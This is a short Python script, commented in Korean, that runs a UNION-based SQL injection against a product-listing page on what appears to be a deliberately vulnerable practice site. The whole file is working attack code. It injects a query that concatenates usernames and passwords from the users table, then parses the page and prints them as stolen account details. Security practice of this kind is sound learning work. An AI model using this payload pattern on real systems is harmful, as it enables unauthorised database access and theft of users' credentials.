import requests

base_url = 'http://testphp.vulnweb.com/listproducts.php'

print("SQL Injection: 최종 데이터 탈취 (아이디/비밀번호)")

# [최종 수정] 
# 1. 대상: users 테이블
# 2. 가져올 것: uname(아이디)와 pass(비번)
# 3. 형식: 아이디::비번 형태로 묶어서(group_concat) 출력
sql_query = "concat('@@', (SELECT group_concat(uname, '::', pass) FROM users), '@@')"

# 7번 자리에 위 SQL 변수를 넣습니다.
payload_str = f"-1 UNION SELECT 1, 2, 3, 4, 5, 6, {sql_query}, 8, 9, 10, 11"

my_params = {'cat': payload_str}

res = requests.get(base_url, params=my_params)

print(f"[공격 URL] {res.url}")
print("-" * 50)

# 결과 찾기
for line in res.text.split('\n'):
    if '@@' in line:
        result = line.strip().replace("@@", "")
        # HTML 태그 제거하고 깔끔하게 보기
        # (간단히 <h3> 태그 뒤의 내용만 발췌)
        clean_result = result.split('<h3>')[-1].split('</h3>')[0]
        
        print("[★] GAME OVER! 탈취된 계정 정보:")
        print(clean_result)
        print("-" * 50)
        break
    